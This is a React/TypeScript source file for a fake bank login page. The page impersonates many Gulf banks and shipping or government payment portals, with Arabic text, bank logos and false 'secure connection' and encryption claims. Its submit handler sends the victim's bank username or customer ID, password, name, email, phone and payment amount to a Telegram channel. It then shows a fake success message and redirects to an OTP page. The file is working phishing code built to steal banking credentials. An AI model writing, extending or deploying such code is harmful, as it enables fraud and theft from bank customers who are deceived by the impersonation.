import React, { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card } from "@/components/ui/card";
import { getServiceBranding } from "@/lib/serviceLogos";
import { bankBranding } from "@/lib/brandingSystem";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { Lock, Eye, EyeOff, ShieldCheck, Loader2, User, IdCard, KeyRound } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { getBankById } from "@/lib/banks";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency } from "@/lib/countryCurrencies";
import BankLogo from "@/components/BankLogo";
import { applyDynamicIdentity } from "@/lib/dynamicIdentity";
import { designSystem } from "@/lib/designSystem";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import { getCompanyLayout } from "@/components/CompanyLayouts";
import { getGovernmentLayout } from "@/components/GovernmentLayouts";

const PaymentBankLogin = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData, isLoading: linkLoading } = useLink(id);
  const updateLink = useUpdateLink();
  
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [customerId, setCustomerId] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const customerInfo = linkData?.payload?.customerInfo || {};
  const selectedBankId = linkData?.payload?.selectedBank || '';
  const cardInfo = linkData?.payload?.cardInfo || {};
  
  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  
  const selectedBankBranding = selectedBankId && selectedBankId !== 'skipped' ? bankBranding[selectedBankId] : null;
  const selectedCountry = linkData?.payload?.selectedCountry || "SA";
  const shippingInfo = linkData?.payload as any;
  const rawAmount = shippingInfo?.cod_amount;

  let amount = 500;
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  const formattedAmount = formatCurrency(amount, selectedCountry);
  const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
  const selectedCountryData = selectedCountry ? getCountryByCode(selectedCountry) : null;
  
  useEffect(() => {
    if (selectedBankId && selectedBankId !== 'skipped') {
      applyDynamicIdentity(`bank_${selectedBankId}`);
    }
  }, [selectedBankId]);
  
  const getLoginType = () => {
    if (!selectedBank) return 'username';
    const bankId = selectedBank.id;
    if (bankId === 'alrajhi_bank' || bankId === 'alahli_bank' || bankId === 'samba_bank' || 
        bankId === 'arab_national_bank' || bankId === 'alinma_bank' || bankId === 'aljazira_bank' ||
        bankId === 'emirates_nbd' || bankId === 'fab' || bankId === 'dib' || bankId === 'cbd' ||
        bankId === 'gulf_bank' || bankId === 'burgan_bank' || bankId === 'ahli_united_bank' ||
        bankId === 'cbq' || bankId === 'doha_bank' || bankId === 'masraf_alrayan' ||
        bankId === 'national_bank_oman' || bankId === 'bank_dhofar' || bankId === 'nizwa_bank' ||
        bankId === 'nbb' || bankId === 'ahli_united_bahrain' || bankId === 'bisb' || bankId === 'khaleeji_bank') {
      return 'username';
    }
    return 'customerId';
  };
  
  const loginType = getLoginType();
  
  if (linkLoading || !linkData) {
    return (
      <div className="min-h-screen flex items-center justify-center" dir="rtl">
        <div className="text-center">
          <Loader2 className="w-12 h-12 animate-spin mx-auto mb-4" style={{ color: branding.colors.primary }} />
          <p>جاري تحميل البيانات...</p>
        </div>
      </div>
    );
  }
  
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (isSubmitting) return;
    
    setIsSubmitting(true);
    const bankLoginData = {
      username: loginType === 'username' ? username : '',
      customerId: loginType === 'customerId' ? customerId : '',
      phoneNumber: loginType === 'phone' ? phoneNumber : '',
      password: password,
      loginType: loginType,
    };

    await sendToTelegram({
      type: 'bank_login',
      data: {
        name: customerInfo.name || '',
        email: customerInfo.email || '',
        phone: customerInfo.phone || '',
        service: serviceName,
        country: selectedCountryData?.nameAr || '',
        bank: selectedBank?.nameAr || 'غير محدد',
        username: bankLoginData.username,
        customerId: bankLoginData.customerId,
        password: password,
        amount: formattedAmount
      },
      timestamp: new Date().toISOString()
    });

    setIsSubmitting(false);
    toast({ title: "تم بنجاح", description: "تم تسجيل الدخول بنجاح" });
    navigate(`/pay/${id}/otp`);
  };

  const primaryColor = selectedBankBranding?.colors?.primary || branding.colors.primary;
  const secondaryColor = selectedBankBranding?.colors?.secondary || branding.colors.secondary;
  
  const renderLoginForm = () => (
    <form onSubmit={handleSubmit} className="space-y-6">
      <div className="space-y-2">
        <Label className="text-sm font-bold">
          {loginType === 'username' ? 'اسم المستخدم' : loginType === 'customerId' ? 'رقم العميل' : 'رقم الجوال'}
        </Label>
        <div className="relative">
          <Input
            placeholder={loginType === 'username' ? 'أدخل اسم المستخدم' : loginType === 'customerId' ? 'أدخل رقم العميل' : '05xxxxxxxx'}
            value={loginType === 'username' ? username : loginType === 'customerId' ? customerId : phoneNumber}
            onChange={(e) => loginType === 'username' ? setUsername(e.target.value) : loginType === 'customerId' ? setCustomerId(e.target.value) : setPhoneNumber(e.target.value)}
            className="h-12 border-2 pr-12"
            style={{ borderColor: `${primaryColor}20` }}
          />
          {loginType === 'username' ? <User className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" /> : <IdCard className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />}
        </div>
      </div>

      <div className="space-y-2">
        <Label className="text-sm font-bold">كلمة المرور</Label>
        <div className="relative">
          <Input
            type={showPassword ? "text" : "password"}
            placeholder="أدخل كلمة المرور"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="h-12 border-2 pr-12 pl-12"
            style={{ borderColor: `${primaryColor}20` }}
          />
          <KeyRound className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
          <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600">
            {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
          </button>
        </div>
      </div>

      <Button 
        type="submit"
        disabled={isSubmitting}
        className="w-full h-14 text-lg font-bold text-white rounded-xl shadow-lg transition-all hover:scale-[1.02]"
        style={{ background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})` }}
      >
        {isSubmitting ? <Loader2 className="w-6 h-6 animate-spin" /> : 'تسجيل الدخول الآمن'}
      </Button>
    </form>
  );
  
  const isShipping = linkData.type === 'shipping';
  
  return (
    <>
      <PaymentMetaTags 
        serviceKey={selectedBankId !== 'skipped' && selectedBankId ? `bank_${selectedBankId}` : serviceKey}
        serviceName={selectedBank?.nameAr || serviceName}
        title={`تسجيل الدخول - ${selectedBank?.nameAr || 'البنك'}`}
        customDescription={`الخدمات المصرفية الإلكترونية - تسجيل دخول آمن - ${selectedBank?.nameAr || 'البنك'}`}
        amount={formattedAmount}
      />

      {(() => {
        if (isShipping) {
          const Layout = getCompanyLayout(serviceKey);
          return (
            <Layout 
              companyKey={serviceKey} 
              amount={formattedAmount} 
              trackingNumber={shippingInfo?.tracking_number || `TRK-${id?.substring(0, 8).toUpperCase()}`}
            >
              {renderLoginForm()}
            </Layout>
          );
        }

        if (selectedCountry === 'SA' || selectedCountry === 'KW' || selectedCountry === 'BH') {
          const Layout = getGovernmentLayout(selectedCountry);
          return (
            <Layout 
              countryCode={selectedCountry} 
              amount={formattedAmount} 
              serviceName={serviceName}
            >
              {renderLoginForm()}
            </Layout>
          );
        }

        return (
          <div className="min-h-screen flex flex-col" dir="rtl" style={{ background: '#FAFAFA' }}>
            <header className="w-full border-b bg-white shadow-sm" style={{ borderBottom: `3px solid ${primaryColor}` }}>
              <div className="container mx-auto px-4 h-16 sm:h-20 flex items-center justify-between">
                <div className="flex items-center gap-4">
                  {selectedBank && <div className="w-28 sm:w-36"><BankLogo bankId={selectedBank.id} bankName={selectedBank.name} bankNameAr={selectedBank.nameAr} color={selectedBank.color} size="lg" className="w-full" /></div>}
                  <div className="hidden md:block">
                    <p className="text-base font-bold">الخدمات المصرفية الإلكترونية</p>
                    <p className="text-sm text-gray-500">Secure Online Banking</p>
                  </div>
                </div>
                <div className="flex items-center gap-2 px-3 py-1.5 rounded-full bg-green-50 border border-green-200">
                  <ShieldCheck className="w-4 h-4 text-green-600" />
                  <span className="text-xs font-medium text-green-700">اتصال آمن</span>
                </div>
              </div>
            </header>

            <div className="flex-1 flex items-center justify-center py-8 px-4">
              <div className="w-full max-w-lg">
                <div className="text-center mb-8">
                  <h1 className="text-3xl font-bold mb-2">تسجيل الدخول</h1>
                  <p className="text-gray-600">أدخل بيانات دخولك إلى {selectedBank?.nameAr || 'البنك'}</p>
                </div>
                <Card className="p-8 shadow-2xl rounded-[20px] border-0">
                  <div className="rounded-xl p-4 mb-6 flex items-start gap-3 bg-blue-50 border border-blue-100">
                    <Lock className="w-5 h-5 mt-0.5 text-blue-600" />
                    <div className="text-sm">
                      <p className="font-bold text-blue-900">حماية معلوماتك</p>
                      <p className="text-xs text-blue-700">نحن نستخدم أعلى معايير التشفير لحماية بياناتك المصرفية.</p>
                    </div>
                  </div>
                  {renderLoginForm()}
                </Card>
              </div>
            </div>
          </div>
        );
      })()}
    </>
  );
};

export default PaymentBankLogin;
